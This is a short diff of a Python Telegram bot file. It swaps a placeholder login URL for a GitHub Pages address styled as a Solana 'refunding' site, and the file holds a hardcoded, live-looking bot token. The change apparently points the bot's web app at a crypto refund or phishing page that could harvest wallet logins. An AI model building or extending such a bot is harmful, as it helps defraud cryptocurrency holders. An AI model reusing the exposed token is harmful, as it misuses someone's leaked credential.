@@ -3,7 +3,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask, redirect
 
 TOKEN = "7879598325:AAFRhrWVUanbI3gxEb4W6Bm1GroQTudgZUQ"
-WEBAPP_URL = "https://yourserver.com/login"
+WEBAPP_URL = "https://refunding212.github.io/solana/"
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
